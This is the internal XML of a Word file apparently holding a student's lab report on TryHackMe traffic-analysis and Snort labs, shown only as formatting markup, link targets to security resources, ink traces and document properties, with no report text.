    <w:lvl w:ilvl="0" w:tplc="5876FFE0">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053CFE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D18EB0E2"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC86">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F124F84"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8E78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230C29"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="93300000"/>
    <w:lvl w:ilvl="0" w:tplc="0FBA9A8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362D82"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F43083CC"/>
    <w:lvl w:ilvl="0" w:tplc="41D28D0E">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90068"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8BCCB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862C25"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4D98172C"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC8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6A3982"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BFE2DEEA"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC8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EF2DDD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7A26942C"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC8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4715B4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4244A98C"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC8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343748"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="09EE5D98"/>
    <w:lvl w:ilvl="0" w:tplc="C5A4DD9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BD7B18"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="66985242"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC8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85C7E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="43905F9C"/>
    <w:lvl w:ilvl="0" w:tplc="5FC4599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D865273"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9FFC3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AC69C2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E77E7F44"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC8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FD022C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3F1C9410"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC8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E25F36"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="02664FFE"/>
    <w:lvl w:ilvl="0" w:tplc="C5A4DD9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E43AC0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C060C712"/>
    <w:lvl w:ilvl="0" w:tplc="C6FEAF12">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="408" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Cambria" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Cambria"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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="624A78DB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="62EC5F9A"/>
    <w:lvl w:ilvl="0" w:tplc="C5A4DD9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35B6083"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="ACA26C7E"/>
    <w:lvl w:ilvl="0" w:tplc="FB7E9E8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22A86"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9B1AD010"/>
    <w:lvl w:ilvl="0" w:tplc="04090001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="888A780A">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3D5250"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="04A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276C66"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8CF06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85FA9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="450AF868"/>
    <w:lvl w:ilvl="0" w:tplc="5176AC86">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E157C9C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="979A6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261B4A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5D3C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777408">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1618560365">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="428698258">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="175117615">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="494495065">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1901598349">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1325235306">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="927497501">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="630749397">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="396822839">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1968470080">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="34699900">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="160122923">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1593081604">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="538976750">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="2027517251">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="1927574968">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="302545927">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="2133789143">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="158159707">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1725132439">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="1587380217">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="161626027">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="494492715">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="199365563">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1862084164">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="1830365535">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="149372180">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="1585794266">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="1713992729">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="1940285213">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="1990284832">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="1866088950">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="921332613">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="478427888">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="19911278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3CEA"/>
    <w:rsid w:val="0003423B"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0007144D"/>
    <w:rsid w:val="000744DE"/>
    <w:rsid w:val="000829B8"/>
    <w:rsid w:val="000A02A9"/>
    <w:rsid w:val="000F4A39"/>
    <w:rsid w:val="000F4F66"/>
    <w:rsid w:val="001215E3"/>
    <w:rsid w:val="00127603"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00162076"/>
    <w:rsid w:val="00193561"/>
    <w:rsid w:val="001B4100"/>
    <w:rsid w:val="001D6E62"/>
    <w:rsid w:val="002132F3"/>
    <w:rsid w:val="002272C8"/>
    <w:rsid w:val="0025499C"/>
    <w:rsid w:val="00261C8C"/>
    <w:rsid w:val="00274D5B"/>
    <w:rsid w:val="0028613E"/>
    <w:rsid w:val="00290B89"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002A10FB"/>
    <w:rsid w:val="002B69FA"/>
    <w:rsid w:val="002C152B"/>
    <w:rsid w:val="002E43AA"/>
    <w:rsid w:val="002E741A"/>
    <w:rsid w:val="003227CE"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="0033317E"/>
    <w:rsid w:val="00340C7C"/>
    <w:rsid w:val="00354915"/>
    <w:rsid w:val="003D69D9"/>
    <w:rsid w:val="003D7EF2"/>
    <w:rsid w:val="0041124C"/>
    <w:rsid w:val="00427DC8"/>
    <w:rsid w:val="00464D87"/>
    <w:rsid w:val="004A3F6D"/>
    <w:rsid w:val="004A5161"/>
    <w:rsid w:val="004D7F1C"/>
    <w:rsid w:val="0051195E"/>
    <w:rsid w:val="00512FED"/>
    <w:rsid w:val="0051703F"/>
    <w:rsid w:val="005214B3"/>
    <w:rsid w:val="0054130D"/>
    <w:rsid w:val="00567626"/>
    <w:rsid w:val="005854F2"/>
    <w:rsid w:val="005A0ABC"/>
    <w:rsid w:val="005A12CD"/>
    <w:rsid w:val="005B5907"/>
    <w:rsid w:val="00603AA7"/>
    <w:rsid w:val="00615EBC"/>
    <w:rsid w:val="0061623E"/>
    <w:rsid w:val="0066300F"/>
    <w:rsid w:val="006644BC"/>
    <w:rsid w:val="00666929"/>
    <w:rsid w:val="00670E5C"/>
    <w:rsid w:val="0068486F"/>
    <w:rsid w:val="006B2109"/>
    <w:rsid w:val="006E7470"/>
    <w:rsid w:val="00714B36"/>
    <w:rsid w:val="00727FA3"/>
    <w:rsid w:val="00761C92"/>
    <w:rsid w:val="007859F3"/>
    <w:rsid w:val="00802753"/>
    <w:rsid w:val="008234CD"/>
    <w:rsid w:val="008463F1"/>
    <w:rsid w:val="00886876"/>
    <w:rsid w:val="008A0A74"/>
    <w:rsid w:val="008B111F"/>
    <w:rsid w:val="00962DBC"/>
    <w:rsid w:val="00980599"/>
    <w:rsid w:val="009D35AB"/>
    <w:rsid w:val="00A12144"/>
    <w:rsid w:val="00A41B4F"/>
    <w:rsid w:val="00A62E0A"/>
    <w:rsid w:val="00A864CB"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AA32E6"/>
    <w:rsid w:val="00AB247E"/>
    <w:rsid w:val="00AB50BC"/>
    <w:rsid w:val="00AD247B"/>
    <w:rsid w:val="00AD51BE"/>
    <w:rsid w:val="00AE27E0"/>
    <w:rsid w:val="00B364BE"/>
    <w:rsid w:val="00B40101"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B66C4E"/>
    <w:rsid w:val="00B71EE2"/>
    <w:rsid w:val="00B74A7E"/>
    <w:rsid w:val="00BB7F85"/>
    <w:rsid w:val="00BE0E56"/>
    <w:rsid w:val="00BE7460"/>
    <w:rsid w:val="00C920E8"/>
    <w:rsid w:val="00CA3B80"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D06C82"/>
    <w:rsid w:val="00D14184"/>
    <w:rsid w:val="00D26BD8"/>
    <w:rsid w:val="00DB67D0"/>
    <w:rsid w:val="00DC5243"/>
    <w:rsid w:val="00DF508E"/>
    <w:rsid w:val="00DF644C"/>
    <w:rsid w:val="00E210D2"/>
    <w:rsid w:val="00E52E47"/>
    <w:rsid w:val="00F014E7"/>
    <w:rsid w:val="00F11787"/>
    <w:rsid w:val="00F15EF6"/>
    <w:rsid w:val="00F25A92"/>
    <w:rsid w:val="00F47592"/>
    <w:rsid w:val="00F5091F"/>
    <w:rsid w:val="00FA5159"/>
    <w:rsid w:val="00FA6AB0"/>
    <w:rsid w:val="00FA6FE2"/>
    <w:rsid w:val="00FC0353"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FD13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2C6596D"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{ED470741-9050-4054-9203-881FF9330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714B36"/>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00464D87"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00464D87"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002272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823381">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="308291611">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1044717985">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1131939557">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1946422192">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="37513136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thereal.com/development.html"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customXml" Target="ink/ink5.xml"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.base64decode.org/" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ubuntu.com/tutorials/command-line-for-beginner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ubuntu.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customXml" Target="ink/ink1.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink4.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.tenable.com/plugins/nessus/97737" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.tenable.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file:///\\192.168.116.138\IPC$" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.snort.org/"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customXml" Target="ink/ink3.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.png"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.base64decode.org/" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image21.png"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://assets.tryhackme.com/cheatsheets/Snort%20Cheatsheet%20-%20TryHackMe.pdf" TargetMode="External"/><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1T19:43:43.389"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.035" units="cm"/>
      <inkml:brushProperty name="height" value="0.035" units="cm"/>
      <inkml:brushProperty name="color" value="#E71224"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1038 5891 24575,'0'0'0,"-1"-17"0,-4-54 0,-5-88 0,-4-106 0,1-86 0,4-62-2455,5-42 2455,3-36 0,5-42-2185,6-41 2185,10-33 0,1 86-3551</inkml:trace>
  <inkml:trace contextRef="#ctx0" brushRef="#br0" timeOffset="294.17">131 2124 24575,'0'0'0,"2"-7"0,4-18 0,7-38 0,13-63 0,13-85 0,14-98 0,18-106-2651,19-89 2651,-6 41-5540</inkml:trace>
  <inkml:trace contextRef="#ctx0" brushRef="#br0" timeOffset="780.69">1 2836 24575,'8'-13'0,"124"-256"0,-83 157 0,327-726 0,-370 825-1365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1T19:58:09.192"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.035" units="cm"/>
      <inkml:brushProperty name="height" value="0.035" units="cm"/>
      <inkml:brushProperty name="color" value="#E71224"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 0 24496,'0'550'0,"810"-550"0,-810-550 0,-810 550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1T19:58:13.495"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.035" units="cm"/>
      <inkml:brushProperty name="height" value="0.035" units="cm"/>
      <inkml:brushProperty name="color" value="#E71224"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1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1T19:58:10.400"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.035" units="cm"/>
      <inkml:brushProperty name="height" value="0.035" units="cm"/>
      <inkml:brushProperty name="color" value="#E71224"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 0 24575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2T16:01:32.345"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.035" units="cm"/>
      <inkml:brushProperty name="height" value="0.035" units="cm"/>
      <inkml:brushProperty name="color" value="#E71224"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 0 24387,'0'508'0,"508"-508"0,-508-508 0,-508 508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Lab Five consisted of TryHackMe labs: Traffic Analysis Essentials, Snort, Snort Challenge – The Basics, and Snort Challenge – Live Attacks. The report documents the objectives and main ideas of all labs.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18</Pages>
  <Words>4008</Words>
  <Characters>22850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[lab FOUR]</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Manager/>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>26805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analysis and snort</dc:title>
  <dc:subject>2/23/2025</dc:subject>
  <dc:creator>Jacob Graessle</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Jacob S Graessle</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-04-25T16:36:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-04-25T16:37:00Z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1e3fbc11e798bd06925fa84e10f6abe579ce7171a0a9e9094f5f4d4ffd7534ae</vt:lpwstr>
  </property>
</Properties>
</file>